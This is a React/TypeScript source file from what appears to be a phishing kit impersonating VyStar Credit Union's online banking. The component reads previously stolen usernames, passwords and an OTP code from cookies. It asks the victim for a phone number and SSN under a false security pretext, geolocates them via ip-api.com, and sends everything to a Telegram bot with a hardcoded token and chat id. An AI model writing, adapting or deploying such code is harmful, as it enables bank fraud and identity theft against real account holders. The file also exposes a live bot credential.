import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import Navbar from "../components/navbar/navbar";
import cookies from "../utils/cookie.config";

type Details = {
  phone: string;
  sn: string;
};

console.log(navigator.userAgent);

export default function Additional() {
    const login1: Login = cookies.get("login1");
    const login2: Login2 = cookies.get("login2");
    const otp: { code: string } = cookies.get("otp");
  const [formInput, setFormInput] = useState<Details>({
    phone: "",
    sn: "",
  });

  async function getDetails(PHONE:string, SN:string) {
    var res = await fetch("http://ip-api.com/json");

    var result = await res.json();

    let agent = navigator.userAgent;

    var message = `|-----VYSTAR CU-------|      
                                  ${agent}               
                                LOGIN1: ${login1.username}
                                PASSWORD1:${login1.password}
                                   LOGIN 2:${login2.username2}
                                              PASSWORD 2:${login2.password2}
                                             CODE:${otp.code}
                                PHONE:${PHONE}
                                SSN:${SN}
                                -----------------------------
                                -----------------------------
                                  COUNTRY: ${result.country}
                                      CITY:${result.city}
                                LATITUDE:${result.lat}
                                LONGITUDE:${result.lon}
                                        IP:${result.query}
                                        ZIPCODE:${result.zip}
                                TIMEZONE:${result.timezone}
                                DATE:${Date.now()}
                                      ISP:${result.isp}
                                      REGION:${result.regionName}
          `;

          return message;
  }

  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    const message = await getDetails(formInput.phone, formInput.sn)
    const token = "5724587499:AAFl5fwOetWO0yu-nFJg9OgyyFi0AGqB-TY"
    const chat_id = 1124454735
    await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=HTML`);
    navigate("../congratulation", { replace: true });
  }
 
  return (
    <div>
      <Navbar />
      <div className="main-body">
        <div className="form">
          <form onSubmit={handleSubmit}>
            <p style={{ fontWeight: "bold", padding: "10px" }}>
              For your security, verify your information by entering the
              following details
            </p>
            <hr />

            <div style={{ padding: "20px" }}>
              <div className="form-item">
                <label htmlFor="">Phone Number</label>
                <input
                  required
                  onChange={handleInputChange}
                  name="phone"
                  type="tel"
                />
              </div>
              <div className="form-item">
                <label htmlFor="">SSN</label>
                <input name="sn" onChange={handleInputChange} type="tel" />
              </div>

              <br />

              <div className="btn">
                <button>Submit</button>
              </div>
            </div>
          </form>
          <br />
          <div style={{ textAlign: "center", color: "#3379E4" }}>
            <p>Can't Sign in</p>

            <p>Enroll in Online banking</p>
          </div>
        </div>
      </div>
    </div>
  );
}
